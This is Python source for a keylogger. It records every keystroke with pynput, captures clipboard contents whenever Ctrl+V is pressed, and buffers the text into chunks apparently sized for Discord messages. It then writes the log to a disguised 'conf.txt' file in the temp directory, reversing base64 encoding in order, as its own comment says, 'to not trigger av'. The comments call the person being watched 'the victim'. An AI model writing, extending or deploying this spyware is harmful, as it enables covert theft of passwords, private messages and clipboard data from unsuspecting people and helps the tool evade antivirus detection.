from pynput.keyboard import Key
import pynput.keyboard
from PIL import ImageGrab
import pyperclip
import json

import base64, tempfile

temp_dir = tempfile.gettempdir()

ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}

text_buffor, force_to_send = '', False
messages_to_send, files_to_send, embeds_to_send = [], [], []

def cipher_data(x):
    return base64.b64encode(x.encode('utf-8')).decode('utf-8')[::-1] # reversed base64

def on_press(key):
    global files_to_send, messages_to_send, embeds_to_send, text_buffor
    processed_key = str(key)[1:-1] if (str(key)[0]=='\'' and str(key)[-1]=='\'') else key
    keycodes = {
        Key.space : ' ',
        Key.shift : ' *`SHIFT`* ',
        Key.tab : ' *`TAB`* ',
        Key.backspace : ' *`<`* ',
        Key.esc : ' *`ESC`* ',
        Key.caps_lock : ' *`CAPS LOCK`* ',
        Key.f1 : ' *`F1`* ',
        Key.f2 : ' *`F2`* ',
        Key.f3 : ' *`F3`* ',
        Key.f4 : ' *`F4`* ',
        Key.f5 : ' *`F5`* ',
        Key.f6 : ' *`F6`* ',
        Key.f7 : ' *`F7`* ',
        Key.f8 : ' *`F8`* ',
        Key.f9 : ' *`F9`* ',
        Key.f10 : ' *`F10`* ',
        Key.f11 : ' *`F11`* ',
        Key.f12 : ' *`F12`* ',

    }
    
    if processed_key in ctrl_codes.keys():
        if processed_key == '\\x16':
            processed_key = ' `' + ctrl_codes[processed_key] + " > " + pyperclip.paste() + '`'
        else:
            processed_key = ' `' + ctrl_codes[processed_key] + '`'

    if processed_key not in [Key.ctrl_l, Key.alt_gr, Key.left, Key.right, Key.up, Key.down, Key.delete, Key.alt_l, Key.shift_r]:
        for i in keycodes:
            if processed_key == i:
                processed_key = keycodes[i]
        if processed_key == Key.enter:
            processed_key = ''; messages_to_send.append([text_buffor + ' *`ENTER`*']); text_buffor = ''
        elif processed_key == Key.print_screen or processed_key == '@':
                processed_key = ' *`Print Screen`*' if processed_key == Key.print_screen else '@'
                #ImageGrab.grab(all_screens=True).save('ss.png')

        text_buffor += str(processed_key)

        if len(text_buffor) > 1975:
            messages_to_send.append([text_buffor])
            text_buffor = ''

    with open(f'{temp_dir}\\conf.txt', 'w') as f:
        f.write(cipher_data(str(json.dumps(messages_to_send,indent=4)))) # ciphered to not trigger av just in case the victim pastes a malicious code | json is for formatting and to become more readable


listener = pynput.keyboard.Listener(on_press=on_press)

def startKeyLog():
    with open(f'{temp_dir}\\conf.txt', 'w') as f:
        f.write('')
    try:
        listener.start()
    except Exception as e:
        print(e)

def stopKeyLog():
    try:
        listener.stop()
    except:
        ... 
